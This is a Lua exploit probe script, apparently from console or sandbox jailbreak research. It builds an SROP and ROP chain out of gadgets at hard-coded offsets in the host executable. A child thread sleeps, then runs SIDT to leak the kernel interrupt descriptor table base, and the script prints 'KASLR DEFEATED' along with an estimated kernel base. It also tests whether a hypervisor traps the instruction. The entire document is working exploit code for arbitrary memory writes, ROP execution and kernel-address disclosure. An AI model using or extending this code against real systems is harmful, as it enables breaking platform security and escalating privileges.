-- CRASH_CLASS: MODERATE
-- PROBE 144g: SIDT with delayed execution
--
-- Child thread: nanosleep(2s) → SIDT → nanosleep(30s)
-- Main thread: confirm thread alive, prep IDT buffer, then wait for SIDT
-- If SIDT crashes process, we still get pre-crash output.
-- If SIDT succeeds, IDT buffer has kernel pointer → KASLR defeated.
-- If HV gives fake (zeros), IDT buffer is zeroed → HV intercept confirmed.

print("=== PROBE 144g: DELAYED SIDT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC_S = 0x40
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr = make_syscall(430)
local sc_mmap = make_syscall(477)
local sc20 = make_syscall(20)
local sc_ns = make_syscall(240)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))
print("eboot=" .. string.format("0x%X%08X", ehi, elo))

local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC_S + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

local function srop(num, a1, a2)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC_S + 0xA0, sc_addr)
    wq(srop_ctx + MC_S + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC_S + 0x08, a1) end
    if a2 then wq(srop_ctx + MC_S + 0x10, a2) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local g_ret = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_sidt = uint64(string.format("0x%X%08X", ehi, elo + 0x1C29F9))

-- Verify SIDT gadget
local gadget_ok = true
local exp_bytes = {0x0F, 0x01, 0x48, 0x8D, 0x41, 0x01, 0x48, 0x29, 0xC3}
for i, e in ipairs(exp_bytes) do
    local b = safe_rd(g_sidt + (i-1))
    if b == nil or (b % 256) ~= e then gadget_ok = false end
end
print("gadget_verify=" .. tostring(gadget_ok))
if not gadget_ok then
    print("=== ABORT ===")
    do return end
end

-- IDT output buffer with sentinel
local idt_out = gpu + 0x000
for i = 0, 15, 4 do wd(idt_out + i, 0xEEEEEEEE) end

-- Scratch for ADD [R8+0x29],ECX
local scratch = gpu + 0x100
for i = 0, 63, 4 do wd(scratch + i, 0) end

-- Timespecs
local tspec_delay = gpu + 0x200
wq(tspec_delay, uint64(2))
wq(tspec_delay + 8, uint64(0))

local tspec_long = gpu + 0x210
wq(tspec_long, uint64(30))
wq(tspec_long + 8, uint64(0))

local ts_1s = memory.alloc(16)
wq(ts_1s, uint64(1))
wq(ts_1s + 8, uint64(0))

print("")
print("--- [A] Create delayed SIDT thread ---")

local ctx = gpu + 0x10000
for off = 0, 0x4FF, 4 do wd(ctx + off, 0) end
pcall(function() return sc_gc(uint64(ctx)) end)

-- ROP chain: nanosleep(2s) → pop_rax → SIDT → nanosleep(30s)
local stack = gpu + 0x20000
for off = 0, 0x7FFF, 4 do wd(stack + off, 0) end
local rop = stack + 0x7000

-- Phase 1: 2-second delay
wq(rop + 0x00, g_pop_rdi)
wq(rop + 0x08, ua(tspec_delay))
wq(rop + 0x10, g_pop_rsi)
wq(rop + 0x18, uint64(0))
wq(rop + 0x20, g_pop_rax)
wq(rop + 0x28, uint64(240))
wq(rop + 0x30, sc_addr)

-- Phase 2: SIDT
wq(rop + 0x38, g_pop_rax)
wq(rop + 0x40, ua(idt_out + 0x73))
wq(rop + 0x48, g_sidt)

-- Phase 3: nanosleep(30s) to keep alive if SIDT works
wq(rop + 0x50, g_pop_rdi)
wq(rop + 0x58, ua(tspec_long))
wq(rop + 0x60, g_pop_rsi)
wq(rop + 0x68, uint64(0))
wq(rop + 0x70, g_pop_rax)
wq(rop + 0x78, uint64(240))
wq(rop + 0x80, sc_addr)

-- Set only RIP, RSP, and R8 (pure getcontext pattern)
wq(ctx + 0xE0, g_ret)
wq(ctx + 0xF8, ua(rop))
wq(ctx + MC_S + 0x28, ua(scratch))

local tid_buf = gpu + 0x40000
wq(tid_buf, uint64(0))

local ok_t, rv_t = pcall(function()
    return sc_thr(uint64(ctx), uint64(tid_buf), uint64(0))
end)
local tq = safe_rq(tid_buf)
local t_h, t_l = get_hi_lo(tq)
print("[A] rv=" .. tostring(rv_t) .. " tid=" .. t_l)

if to_num(rv_t) ~= 0 then
    print("[A] THREAD FAILED")
    print("=== DONE ===")
    do return end
end

-- Check thread alive
local kill_rv = srop(433, uint64(t_l), uint64(0))
local k_h, k_l = get_hi_lo(kill_rv)
print("[A] thread " .. ((k_l == 0 and k_h == 0) and "ALIVE" or "dead"))

print("")
print("--- [B] Waiting for SIDT (thread sleeps 2s first) ---")
print("[B] IDT sentinel: " .. string.format("0x%08X", safe_rd(idt_out) or 0))
print("[B] If process dies after this, SIDT is HV-trapped")

-- Wait 1s
pcall(function() sc_ns(uint64(ts_1s), uint64(0)) end)
print("[B] 1s elapsed, checking IDT...")
local changed_1 = false
for off = 0, 9 do
    local b = safe_rd(idt_out + off)
    if b and (b % 256) ~= 0xEE then changed_1 = true end
end
print("[B] IDT at 1s: " .. (changed_1 and "CHANGED" or "sentinel"))

-- Wait another 1.5s (total ~2.5s, thread should have hit SIDT)
pcall(function() sc_ns(uint64(ts_1s), uint64(0)) end)
local ts_500ms = memory.alloc(16)
wq(ts_500ms, uint64(0))
wq(ts_500ms + 8, uint64(500000000))
pcall(function() sc_ns(uint64(ts_500ms), uint64(0)) end)

print("[B] 2.5s elapsed, checking IDT...")
local changed_2 = false
for off = 0, 9 do
    local b = safe_rd(idt_out + off)
    if b and (b % 256) ~= 0xEE then changed_2 = true end
end

if changed_2 then
    print("")
    print("[B] *** SIDT WROTE DATA! ***")
    for off = 0, 15, 4 do
        print("[B] +" .. string.format("%02X", off) .. " = 0x" ..
            string.format("%08X", safe_rd(idt_out + off) or 0))
    end
    local base = safe_rq(idt_out + 2)
    if base then
        local bh, bl = get_hi_lo(base)
        print("[B] IDT base = " .. hex(base))
        if bh >= 0xFFFF8000 and bh ~= 0xFFFFFFFF then
            print("")
            print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
            print("!!! KASLR DEFEATED !!! KERNEL POINTER !!!")
            print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
            local kbase_l = bl - (bl % 0x200000)
            print("kernel_base ~= " .. string.format("0x%08X%08X", bh, kbase_l))
        elseif bh == 0 and bl == 0 then
            print("[B] base=0 — HV returns fake SIDT values")
        else
            print("[B] base not kernel range — HV redirected")
        end
    end
else
    print("[B] Sentinel still intact at 2.5s")
    print("[B] Either: SIDT crashed process (you won't see this)")
    print("[B]     or: thread still sleeping (shouldn't happen)")
end

-- Check scratch
local sc_mod = false
for off = 0, 63, 4 do
    local v = safe_rd(scratch + off)
    if v and v ~= 0 then sc_mod = true end
end
print("[B] scratch=" .. (sc_mod and "MODIFIED" or "clean"))

-- Thread still alive?
local kill2 = srop(433, uint64(t_l), uint64(0))
local k2h, k2l = get_hi_lo(kill2)
print("[B] thread " .. ((k2l == 0 and k2h == 0) and "ALIVE" or "dead"))

print("")
print("=== PROBE 144g COMPLETE ===")
